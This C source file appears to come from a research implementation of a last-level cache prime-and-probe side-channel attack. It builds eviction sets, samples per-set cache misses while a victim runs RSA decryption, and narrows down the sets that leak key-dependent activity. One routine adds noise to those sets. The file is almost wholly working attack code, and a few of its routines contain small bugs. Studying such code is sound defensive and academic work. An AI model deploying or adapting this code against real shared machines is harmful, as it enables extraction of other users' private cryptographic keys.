#include "EvictionSet.h"
#include "CacheFuncs.h"

#include <time.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>


int NUMBER_OF_KEYS_TO_SAMPLE = 100;

//#define PRINTF printf
#define PRINTF(bla...)

extern char* RsaKeys[NUMBER_OF_DIFFERENT_KEYS];

#if KEYS_LEN_IN_BITS == 4096
#define MAX_WRONG_ZEROS 1
#define MAX_WRONG_ONES  1
#define MAX_SAMPLES_PER_BIT 9
#else
#define MAX_WRONG_ZEROS 1
#define MAX_WRONG_ONES  1
#define MAX_SAMPLES_PER_BIT 8
#endif

#define BITS_IN_CHUNK 16
#define MAX_HANDLED_EXTRA_BITS 30
#define MAX_MISSING_BITS 300
#define MAX_WRONG_BITS_IN_CHUNK 2

#define BAD_BIT 0xa

LinesBuffer TestBuffer;

/**
 * To make sure the pre-fetcher can't learn our cache usage, we randomize the order in which
 * we access lines in a set.
 */
void RandomizeRawSet(Raw_Cache_Set* pSet);

/**
 * Same thing but for a smaller set.
 *
 * TODO: merge these 2 functions, no real reason to have double of these.
 */
void RandomizeSet(Cache_Set* pSet);

/**
 * Gets a list of lines, and a line that conflicts with them.
 *
 * Goes over the list and searches for the exact subset that causes the conflict.
 * Then returns it in the pSmallSet pointer.
 * Returns the number of lines in said set.
 */
int FindSet(Raw_Cache_Set* pBigSet, Cache_Set* pSmallSet, char* pConflictingLine);

/**
 * Returns the number of set a certain address is associated with
 */
int AdressToSet(char* Adress);





int CreateEvictionSetFromBuff(LinesBuffer* pBuffer, Cache_Mapping* pEvictionSets)
{
	return CreateEvictionSetFromMem(pBuffer->Lines->Bytes, sizeof(LinesBuffer), pEvictionSets);
}

int CreateEvictionSetFromMem(char* Memory, uint32_t Size, Cache_Mapping* pCacheSets)
{
	int i, j;
	Raw_Cache_Mapping RawMapping;
	int FilledSetIndex = 0;
	int SetsInCurrModulu;
	int CurrSetInSlice;
	int FindSetAttempts;

	memset(pCacheSets, 0, sizeof(Cache_Mapping));
	memset(&RawMapping, 0, sizeof(RawMapping));

	// Go over all raw sets and split them to real sets.
	for (j = 0; j < RAW_SETS; j++)
	{
		for (i = j * BYTES_IN_LINE, SetsInCurrModulu = 0; i < Size && SetsInCurrModulu < SLICE_NUM; i += BYTES_IN_LINE * RAW_SETS)
		{
			// Get bit 1 of the slice.
			char* CurrAdress = Memory + i;
			int Set = AdressToSet(CurrAdress);
			int Miss = 0;

			// First of all, determine if this line belongs to a set we already found!
			for (CurrSetInSlice = FilledSetIndex - SetsInCurrModulu; CurrSetInSlice < FilledSetIndex; CurrSetInSlice++)
			{
				Miss = ProbeManyTimes(pCacheSets->Sets[CurrSetInSlice].Lines[0], pCacheSets->Sets[CurrSetInSlice].ValidLines, CurrAdress);

				// If the line conflicts with this set, give it up, we don't care about it no more
				if (Miss) break;
			}

			if (Miss) continue;

			// Now go over all the relevant sets and check
			RandomizeRawSet(&RawMapping.Sets[Set]);
			Miss = ProbeManyTimes(RawMapping.Sets[Set].Lines[0], RawMapping.Sets[Set].ValidLines, CurrAdress);

			// If its a miss, there is no conflict, insert line into raw set.
			if (!Miss) {
				if (RawMapping.Sets[Set].ValidLines >= RAW_LINES_IN_SET)
				{
					break;
				}

				RawMapping.Sets[Set].Lines[RawMapping.Sets[Set].ValidLines] = CurrAdress;
				RawMapping.Sets[Set].ValidLines++;
			}
			// A miss means we conflict with a set. find the conflicting set!
			else
			{
				// We try and find the set a few times... mostly because at some point in the past
				// The function wasn't stable enough.
				for (FindSetAttempts = 0; FindSetAttempts < 3; FindSetAttempts++)
				{
					int FoundNewSet = FindSet(&RawMapping.Sets[Set], &pCacheSets->Sets[FilledSetIndex], CurrAdress);
					SetsInCurrModulu += FoundNewSet;
					FilledSetIndex += FoundNewSet;

					if (FoundNewSet)
					{
						printf("Found set %d\r\n\033[1A", FilledSetIndex);
						RandomizeSet(&pCacheSets->Sets[FilledSetIndex]);
						break;
					}
				}
			}
		}
	}

	pCacheSets->ValidSets = FilledSetIndex;
	return FilledSetIndex;
}

int AdressToSet(char* Adress)
{
	return (((uint64_t)Adress >> 6) & 0b1111111111);
}

void RandomizeRawSet(Raw_Cache_Set* pSet)
{
	int LineIdx;
	int* LinesInSet = malloc(sizeof(int) * pSet->ValidLines);

	if (pSet->ValidLines == 0)
		return;

	// At the start of the randomization process, every line points to the
	// next line in the array.
	for (LineIdx = 0; LineIdx < pSet->ValidLines - 1; LineIdx++)
	{
		LinesInSet[LineIdx] = LineIdx + 1;
	}

	int LinesLeft = pSet->ValidLines - 1;
	int CurrLine = 0;

	// Now go over the linked list and randomize it
	for (LineIdx = 0; LineIdx < pSet->ValidLines && LinesLeft > 0; LineIdx++)
	{
		int NewPos = rand() % LinesLeft;
		unsigned int RandomLine = LinesInSet[NewPos];
		LinesInSet[NewPos] = LinesInSet[LinesLeft - 1];
		LinesInSet[LinesLeft - 1] = 0;
		LinesLeft--;
		*((uint64_t*)pSet->Lines[CurrLine]) = ((uint64_t)pSet->Lines[RandomLine]);
		CurrLine = RandomLine;
	}

	*((uint64_t*)pSet->Lines[CurrLine]) = 0;

	free(LinesInSet);
}

void RandomizeSet(Cache_Set* pSet)
{
	int LineIdx;
	int* LinesInSet = malloc(sizeof(int) * pSet->ValidLines);

	if (pSet->ValidLines == 0){
		free(LinesInSet);
		return;
	}

	// At the start of the randomization process, every line points to the
	// next line in the array.
	for (LineIdx = 0; LineIdx < pSet->ValidLines - 1; LineIdx++)
	{
		LinesInSet[LineIdx] = LineIdx + 1;
	}

	int LinesLeft = pSet->ValidLines - 1;
	int CurrLine = 0;

	// Now go over the linked list and randomize it
	for (LineIdx = 0; LineIdx < pSet->ValidLines && LinesLeft > 0; LineIdx++)
	{
		int NewPos = rand() % LinesLeft;
		unsigned int RandomLine = LinesInSet[NewPos];
		LinesInSet[NewPos] = LinesInSet[LinesLeft - 1];
		LinesInSet[LinesLeft - 1] = 0;
		LinesLeft--;
		*((uint64_t*)pSet->Lines[CurrLine]) = ((uint64_t)pSet->Lines[RandomLine]);
		CurrLine = RandomLine;
	}

	*((uint64_t*)pSet->Lines[CurrLine]) = 0;

	free(LinesInSet);
}

/**
 * Sometimes, when looking for a new set, we find too many lines.
 * This function tries to get rid of the most unlikely lines and go down to 12.
 */
int DecreaseSetSize(Raw_Cache_Set* pSmallSet, char* pConflictingLine)
{
	int ConflictLineIndex;
	char* pLinesAnchor;
	int i;
	int Attempts = 5;

	while (pSmallSet->ValidLines > LINES_IN_SET && Attempts)
	{
		RandomizeRawSet(pSmallSet);
		pLinesAnchor = pSmallSet->Lines[0];
		char* pLinesCurrentEnd = pSmallSet->Lines[0];
		Attempts--;

		// Find the end of the set
		while (*(char**)pLinesCurrentEnd != 0)
		{
			pLinesCurrentEnd = *(char**)pLinesCurrentEnd;
		}

		// Find all the lines in the conflict set which are the same set as the target.
		for (ConflictLineIndex = 0; ConflictLineIndex < pSmallSet->ValidLines; ConflictLineIndex++)
		{
			char* pCurrLine = pLinesAnchor;

			if (pLinesAnchor == NULL)
			{
				break;
			}

			// Pop the first line out of the conflict set.
			pLinesAnchor = *((char**)pLinesAnchor);

			// If the line we removed conflicted with the new line, add the line to the set.
			if (!ProbeManyTimes(pLinesAnchor, pSmallSet->ValidLines - 1, pConflictingLine))
			{
				*((char**)pLinesCurrentEnd) = pCurrLine;
				pLinesCurrentEnd = pCurrLine;
			}
			// Line does not conflict, and is therefore not interesting, move it to non conflicting list.
			else
			{
				// Find the line in the small set and remove it.
				for (i = 0; i < pSmallSet->ValidLines; i++)
				{
					if (pSmallSet->Lines[i] == pCurrLine) {
						pSmallSet->Lines[i] = pSmallSet->Lines[pSmallSet->ValidLines - 1];
						pSmallSet->ValidLines --;
					}
				}

				if (pSmallSet->ValidLines <= LINES_IN_SET)
				{
					break;
				}
			}
		}
	}

	// Lets check wether these lines coincide
	if (pSmallSet->ValidLines == LINES_IN_SET)
	{
		RandomizeRawSet(pSmallSet);
		while (ProbeManyTimes(pSmallSet->Lines[0], pSmallSet->ValidLines, pConflictingLine))
		{
			return 1;
		}
	}

	return 0;
}

int FindSet(Raw_Cache_Set* pBigSet, Cache_Set* pSmallSet, char* pConflictingLine)
{
	char* pNewSetEnd 					= NULL;
	char* pNonConflictingAnchor 		= pBigSet->Lines[0];
	char* pLinesAnchor 					= pBigSet->Lines[0];
	char* pLinesCurrentEnd				= pBigSet->Lines[0];
	int ConflictLineIndex;
	int LineInEvictionSet 				= 0;
	int CurrentConflictSize 			= pBigSet->ValidLines;
	Raw_Cache_Set tmpSet;
	int SetFound						= 0;
	int BigSetIdx, SmallSetIdx;
	int WhileIdx = 0;
	int LinesToCheck;
	static int ElevenLinesSetsFound = 0;

	// Big set is the linked list with the potential lines for the set.
	// If its less then LINES_IN_SET there isn't really anything to do.
	if (pBigSet->Lines[0] == NULL || pBigSet->ValidLines < LINES_IN_SET)
		return 0;

	RandomizeRawSet(pBigSet);

	// Find the end of the set
	while (*(char**)pLinesCurrentEnd != 0)
	{
		pLinesCurrentEnd = *(char**)pLinesCurrentEnd;
	}

	// If we haven't found enough lines and not enough left to check, leave.
	if (pBigSet->ValidLines < 12)
	{
		return 0;
	}
	// If we have exactly 12 lines, then we already have the full set.
	else if (pBigSet->ValidLines == 12)
	{
		memcpy(&tmpSet, pBigSet, sizeof(tmpSet));
		LineInEvictionSet = 12;
	}
	// Many lines are available, need to extract the ones which belong to the set.
	else
	{
		// Due to noise we might not be able to filter all irrelevant lines on first try.
		// So keep trying!
		while (LineInEvictionSet < LINES_IN_SET)
		{
			LinesToCheck = pBigSet->ValidLines - LineInEvictionSet;
			WhileIdx++;

			// Remerge the 2 lists together, and try finding conflicting lines once more
			if (WhileIdx > 1)
			{
				*(char**)pNewSetEnd = pLinesAnchor;
				pLinesAnchor = pNonConflictingAnchor;
				CurrentConflictSize = pBigSet->ValidLines;
			}

			// Eh, if we tried 5 times and still haven't succeeded, just give up.
			// We don't want to work forever.
			if (WhileIdx > 5)
				break;

			pNewSetEnd = NULL;
			pNonConflictingAnchor = NULL;

			// Find all the lines in the conflict set which are the same set as the target.
			for (ConflictLineIndex = 0; ConflictLineIndex < LinesToCheck; ConflictLineIndex++)
			{
				char* pCurrLine = pLinesAnchor;

				if (pLinesAnchor == NULL)
				{
					break;
				}

				// Pop the first line out of the conflict set.
				pLinesAnchor = *((char**)pLinesAnchor);

				// If the line we removed conflicted with the new line, add the line to the set.
				if (!ProbeManyTimes(pLinesAnchor, CurrentConflictSize - 1, pConflictingLine))
				{
					tmpSet.Lines[LineInEvictionSet] = pCurrLine;
					*(char**)pCurrLine = 0;

					LineInEvictionSet++;
					*((char**)pLinesCurrentEnd) = pCurrLine;
					pLinesCurrentEnd = pCurrLine;
				}
				// Line does not conflict, and is therefore not interesting, move it to non conflicting list.
				else
				{
					if (pNewSetEnd == NULL)
						pNewSetEnd = pCurrLine;

					CurrentConflictSize--;
					*((char**)pCurrLine) = pNonConflictingAnchor;
					pNonConflictingAnchor = pCurrLine;
				}
			}
		}
	}

	// Lets check wether these lines conflict
	if (LineInEvictionSet >= LINES_IN_SET)			//Allow only 12 lines/set!!!!
	{
		tmpSet.ValidLines = LineInEvictionSet;
		RandomizeRawSet(&tmpSet);

		// Make sure the new set still conflicts with the line.
		if (ProbeManyTimes(tmpSet.Lines[0], tmpSet.ValidLines, pConflictingLine) &&
			ProbeManyTimes(tmpSet.Lines[0], tmpSet.ValidLines, pConflictingLine) &&
			ProbeManyTimes(tmpSet.Lines[0], tmpSet.ValidLines, pConflictingLine))
		{
			// If there are too many lines, keep trimming then down.
			if (LineInEvictionSet > LINES_IN_SET)
				SetFound = DecreaseSetSize(&tmpSet, pConflictingLine);
			else
				SetFound = 1;
		}

		// Yay, the set is valid, lets call it a day.
		if (SetFound)
		{
			if (LineInEvictionSet == 11)
			{
				ElevenLinesSetsFound++;
			}

			// Remove the lines in the new set from the list of potential lines.
			for (SmallSetIdx = 0; SmallSetIdx < tmpSet.ValidLines; SmallSetIdx++)
			{
				BigSetIdx = 0;
				pSmallSet->Lines[SmallSetIdx] = tmpSet.Lines[SmallSetIdx];

				while (BigSetIdx < pBigSet->ValidLines)
				{
					// if its the same line, remove it from the big set.
					if (pBigSet->Lines[BigSetIdx] == tmpSet.Lines[SmallSetIdx])
					{
						pBigSet->Lines[BigSetIdx] = pBigSet->Lines[pBigSet->ValidLines - 1];
						pBigSet->Lines[pBigSet->ValidLines - 1] = 0;
						pBigSet->ValidLines--;
						break;
					}

					BigSetIdx++;
				}
			}

			pSmallSet->ValidLines = tmpSet.ValidLines;

			return 1;
		} else {
			PRINTF("Bad set!\r\n");
		}
	} else
	{
		PRINTF("Not enough lines %d in set\r\n", LineInEvictionSet);
	}

	return 0;
}


void GetMemoryStatistics(Cache_Mapping* pEvictionSets, Cache_Statistics* pCacheStats)
{
	qword* pSetInterMissTimings[SETS_IN_CACHE];
	int pSetTimingsNum[SETS_IN_CACHE];
	int Set;
	int Sample;
	struct timespec start, end;
	qword TimeSpent;
	int Miss;
	clock_gettime(CLOCK_REALTIME, &start);

	// Go over all sets in the cache and generate their statistics.
	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		pSetInterMissTimings[Set] = malloc(sizeof(qword) * (CACHE_POLL_SAMPLES_PER_SET + 1));
		pSetInterMissTimings[Set][0] = 0;
		pSetTimingsNum[Set] = 1;
		Miss = 0;

		// Sample the sets a pre-determined amount of times.
		for (Sample = 1; Sample <= CACHE_POLL_SAMPLES_PER_SET; Sample++)
		{
			clock_gettime(CLOCK_REALTIME, &start);

			Miss = PollAsm(pEvictionSets->Sets[Set].Lines[0], pEvictionSets->Sets[Set].ValidLines);// pEvictionSets->Sets[Set].ValidLines - 1);

			// If we got a miss, add it to the statistics (do not need to add hits, since
			// all time slots were inited as hits by default.
			if (Miss)
			{
				pSetInterMissTimings[Set][pSetTimingsNum[Set]] = Sample;
				pSetTimingsNum[Set]++;
			}

			do {
				clock_gettime(CLOCK_REALTIME, &end);
				TimeSpent = (qword)(end.tv_nsec - start.tv_nsec) + (qword)(end.tv_sec - start.tv_sec) * 1000000000;
			} while (TimeSpent < CACHE_POLL_TIMEOUT_IN_NANO);

			PRINTF("Time probing cache: %ld ns, sleeping %ld ns.\n", elapsedTime, TimeSpent);
		}
	}

	printf("Parsing the data!\r\n");

	// Time to parse the data.
	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		double Mean = 0;
		double Var = 0;
		double Tmp;

		if (pSetTimingsNum[Set] <= 1)
			continue;

		Mean = pSetInterMissTimings[Set][pSetTimingsNum[Set] - 1];
		Mean /= (pSetTimingsNum[Set] - 1);
		pCacheStats->SetStats[Set].mean = Mean;
		pCacheStats->SetStats[Set].num = pSetTimingsNum[Set] - 1;
		pCacheStats->SetStats[Set].offset = (long int)(pEvictionSets->Sets[Set].Lines[0]) % (SETS_IN_SLICE * 64);

		// Calculate Mean and variance
		for (Sample = 1; Sample < pSetTimingsNum[Set]; Sample++)
		{
			Tmp = (pSetInterMissTimings[Set][Sample] - pSetInterMissTimings[Set][Sample - 1]) - Mean;
			Var += Tmp * Tmp;
		}

		Var /= (pSetTimingsNum[Set] - 1);
		pCacheStats->SetStats[Set].variance = Var;
	}

	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		free(pSetInterMissTimings[Set]);
	}
}

void WriteStatisticsToFile(Cache_Statistics* pCacheStats, char* pFileName, int Sorted)
{
	FILE* pFile;
	pFile = fopen(pFileName, "wr");
	int Set;
	char Stats[150];
	Cache_Statistics SortedStats;

	if (Sorted)
	{
		SortStatistics(pCacheStats, &SortedStats);
	}

	// Time to parse the data.
	for (Set = SETS_IN_CACHE - 1; Set >= 0 ; Set--)
	{
		unsigned int SetNum = (unsigned int)SortedStats.SetStats[Set].mean;
		sprintf(Stats, "Set %d, Num %ld, mean %lf, var %lf, offset %lx\r\n", SetNum, (long int)pCacheStats->SetStats[SetNum].num,
				pCacheStats->SetStats[SetNum].mean, pCacheStats->SetStats[SetNum].variance, pCacheStats->SetStats[SetNum].offset);
		fwrite(Stats, strlen(Stats), 1, pFile);
	}

	fclose(pFile);
}

void SortStatistics(Cache_Statistics* BaseStatistics, Cache_Statistics* StatisticsToSort)
{
	unsigned int FirstIdx, SecondIdx, Set, tmp;

	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		StatisticsToSort->SetStats[Set].num = BaseStatistics->SetStats[Set].num;
		StatisticsToSort->SetStats[Set].mean = Set;
	}

	for (FirstIdx = 0; FirstIdx < SETS_IN_CACHE; FirstIdx++)
	{
		for (SecondIdx = 0; SecondIdx + 1 < SETS_IN_CACHE - FirstIdx; SecondIdx++)
		{
			if (StatisticsToSort->SetStats[SecondIdx + 1].num < StatisticsToSort->SetStats[SecondIdx].num)
			{
				tmp = StatisticsToSort->SetStats[SecondIdx].num;
				StatisticsToSort->SetStats[SecondIdx].num = StatisticsToSort->SetStats[SecondIdx + 1].num;
				StatisticsToSort->SetStats[SecondIdx + 1].num = tmp;
				tmp = StatisticsToSort->SetStats[SecondIdx].mean;
				StatisticsToSort->SetStats[SecondIdx].mean = StatisticsToSort->SetStats[SecondIdx + 1].mean;
				StatisticsToSort->SetStats[SecondIdx + 1].mean = tmp;
			}
		}
	}
}



int findsuspectsWithPatterns(Cache_Mapping* pEvictionSets, int* suspectsSets, int SetsFound){
	FILE* out;
	int i;
	char input[20];
	int numberOfSuspestcs = 0;
	Cache_Statistics orderd_results,results;
	//first we'll run the statistics before we start the decryption
	printf("Press any key to Start collecting statistics\n");
	scanf("%s",input);
	puts("running..");
	Cache_Statistics ZeroStats[NUMBER_OF_STATS];
	memset(&orderd_results,0,sizeof(Cache_Statistics));
	memset(&results,0,sizeof(Cache_Statistics));
	for(i = 0 ; i < NUMBER_OF_STATS ; i++)
	{
		memset(&(ZeroStats[i]),0,sizeof(Cache_Statistics));
	}
	for(i = 0 ; i < NUMBER_OF_STATS -1 ;i++)
		GetMemoryStatistics(pEvictionSets, &(ZeroStats[i]));
	//Now we will try to find the sets with the most change in use - and hope that those sets are the relevant sets.
	printf("Calculation complete\nPlease start the Decryption processes and Press Any key\n");
	scanf("%s",input);
	puts("running..");

	Cache_Statistics OneStats[NUMBER_OF_STATS];
	for(i = 0 ; i < NUMBER_OF_STATS ; i++)
	{
		memset(&(OneStats[i]),0,sizeof(Cache_Statistics));
	}
	for(i = 0; i <NUMBER_OF_STATS -1 ; i++)
		GetMemoryStatistics(pEvictionSets, &(OneStats[i]));
	printf("Calculation complete\n Now we'll try to find the most Change in use sets\n ");
	out = fopen("out.txt","w");
	for(i =0 ; i < SetsFound ; i++){
		int j;
		for(j = 0 ; j< NUMBER_OF_STATS -1 ; j++){
			ZeroStats[NUMBER_OF_STATS -1].SetStats[i].num += ZeroStats[j].SetStats[i].num;
			OneStats[NUMBER_OF_STATS -1].SetStats[i].num += OneStats[j].SetStats[i].num;
		}
		long long num = OneStats[NUMBER_OF_STATS -1].SetStats[i].num -  (ZeroStats[NUMBER_OF_STATS -1].SetStats[i].num);
		if(num > 0)
			results.SetStats[i].num = num;
		if(results.SetStats[i].num > ZERO_ONE_STATISTICS_DIFF_THR){
			suspectsSets[numberOfSuspestcs] = i;
			numberOfSuspestcs++;
		}
	}
	SortStatistics(&results,&orderd_results);
	for(i = 0 ; i< SetsFound ; i++ ){
		fprintf(out,"%lld\n",orderd_results.SetStats[i].num);
	}
	fclose(out);
	return numberOfSuspestcs;

}

int findSuspects(Cache_Mapping* pEvictionSets, int* suspectsSets, int SetsFound){
	int i,set;
	int numberOfSuspestcs = 0;
	Cache_Statistics CacheStats[NUMBER_OF_STATS];
	Cache_Statistics SumStats ,OrderdStats[NUMBER_OF_STATS];
	//grep memory Usgae statistics for some time


	GetMemoryStatistics(pEvictionSets, &(CacheStats[0]));
	SortStatistics(&(CacheStats[0]),&OrderdStats[0]);
	//add the most "touched" sets to the suspects list
	for(i = 0 ; OrderdStats[0].SetStats[SetsFound - i -1].num > SET_STAT_THR_MAX   ; i++);
	for( ; OrderdStats[0].SetStats[SetsFound - i -1].num > SET_STAT_THR_MIN   ; i++){
		unsigned int SetNum = (unsigned int)OrderdStats[0].SetStats[SetsFound - i -1].mean;
		suspectsSets[numberOfSuspestcs] = SetNum;
		numberOfSuspestcs++;
	}
	suspectsSets[numberOfSuspestcs] = -1;
	printf("number of suspects after 1st round: %d\n",numberOfSuspestcs);
	for (i = 1 ; i <NUMBER_OF_STATS ; i++){
		unsigned int threshold = (((1000000000 / numberOfSuspestcs) / CACHE_POLL_TIMEOUT_IN_NANO)) * SEC_TO_TEST_SETS * i;
		printf("Samples per set for round %d: %d\n",i +1,threshold);
		GetMemorySatisticsFromListOfSets(pEvictionSets, &(CacheStats[i]),suspectsSets,threshold );
		SortStatistics(&CacheStats[i],&OrderdStats[i]);
		numberOfSuspestcs = 0;
		int j;
		//for(j = 0 ; OrderdStats[i].SetStats[SetsFound - j -1].num > ((threshold *7)/8)   ; j++);
		for( j=0 ; OrderdStats[i].SetStats[SetsFound - j -1].num > (threshold * 65/100)  ; j++){
			unsigned int SetNum = (unsigned int)OrderdStats[i].SetStats[SetsFound - j -1].mean;
			suspectsSets[numberOfSuspestcs] = SetNum;
			numberOfSuspestcs++;
		}
		suspectsSets[numberOfSuspestcs] = -1;
		printf("number of suspects after round %d: %d\n",i+1,numberOfSuspestcs);
		printf("sets numbers:\n");
				for(j = 0; j < numberOfSuspestcs ; j++){
					printf("%d) %d traces: %d\n",j,suspectsSets[j],CacheStats[i].SetStats[suspectsSets[j]].num);
				}
	}
	return numberOfSuspestcs;
}

void noiseSuspectedSets(Cache_Mapping* pEvictionSets, int* suspectsSets , int suspectsNum){
	exitflag =1;
	while(exitflag){
		int i,j;
		for(i = 0 ; i < suspectsNum ; i++){

			if( 1 == pEvictionSets->Sets[suspectsSets[i]].Lines[0][0]) j++;
		}
	}
}

int IsSuspectSet(int setnum,int* suspectsSets){
	int i;
	for(i = 0 ; suspectsSets[i] != -1 ; i++ )
		if (setnum  == suspectsSets[i]) return 1;
	return 0;
}

void GetMemorySatisticsFromListOfSets(Cache_Mapping* pEvictionSets, Cache_Statistics* pCacheStats,int* SetsToTest,int NumOfSamplesPerSet)
{
	qword* pSetInterMissTimings[SETS_IN_CACHE];
	int pSetTimingsNum[SETS_IN_CACHE];
	int Set;
	int Sample;
	struct timespec start, end;
	qword TimeSpent;
	int Miss;
	clock_gettime(CLOCK_REALTIME, &start);

	// Go over all sets in the cache and generate their statistics.
	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		pSetInterMissTimings[Set] = malloc(sizeof(qword) * (NumOfSamplesPerSet + 1));
		if(IsSuspectSet(Set,SetsToTest)){

			pSetInterMissTimings[Set][0] = 0;
			pSetTimingsNum[Set] = 1;
			Miss = 0;

			// Sample the sets a pre-determined amount of times.
			for (Sample = 1; Sample <= NumOfSamplesPerSet; Sample++)
			{
				clock_gettime(CLOCK_REALTIME, &start);

				Miss = PollAsm(pEvictionSets->Sets[Set].Lines[0], pEvictionSets->Sets[Set].ValidLines);// pEvictionSets->Sets[Set].ValidLines - 1);

				// If we got a miss, add it to the statistics (do not need to add hits, since
				// all time slots were initied as hits by default.
				if (Miss)
				{
					pSetInterMissTimings[Set][pSetTimingsNum[Set]] = Sample;
					pSetTimingsNum[Set]++;
				}

				do {
					clock_gettime(CLOCK_REALTIME, &end);
					TimeSpent = (qword)(end.tv_nsec - start.tv_nsec) + (qword)(end.tv_sec - start.tv_sec) * 1000000000;
				} while (TimeSpent < CACHE_POLL_TIMEOUT_IN_NANO);

				PRINTF("Time probing cache: %ld ns, sleeping %ld ns.\n", elapsedTime, TimeSpent);
			}
		}
	}

	printf("Parsing the data!\r\n");

	// Time to parse the data.
	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		if(IsSuspectSet(Set,SetsToTest)){
			double Mean = 0;
			double Var = 0;
			double Tmp;

			if (pSetTimingsNum[Set] <= 1)
				continue;

			Mean = pSetInterMissTimings[Set][pSetTimingsNum[Set] - 1];
			Mean /= (pSetTimingsNum[Set] - 1);
			pCacheStats->SetStats[Set].mean = Mean;
			pCacheStats->SetStats[Set].num = pSetTimingsNum[Set] - 1;
			pCacheStats->SetStats[Set].offset = (long int)(pEvictionSets->Sets[Set].Lines[0]) % (SETS_IN_SLICE * 64);

			// Calculate Mean and variance
			for (Sample = 1; Sample < pSetTimingsNum[Set]; Sample++)
			{
				Tmp = (pSetInterMissTimings[Set][Sample] - pSetInterMissTimings[Set][Sample - 1]) - Mean;
				Var += Tmp * Tmp;
			}

			Var /= (pSetTimingsNum[Set] - 1);
			pCacheStats->SetStats[Set].variance = Var;
		}
		else
			pCacheStats->SetStats[Set].num = 0;
	}

	for (Set = 0; Set < SETS_IN_CACHE; Set++)
	{
		free(pSetInterMissTimings[Set]);
	}
}
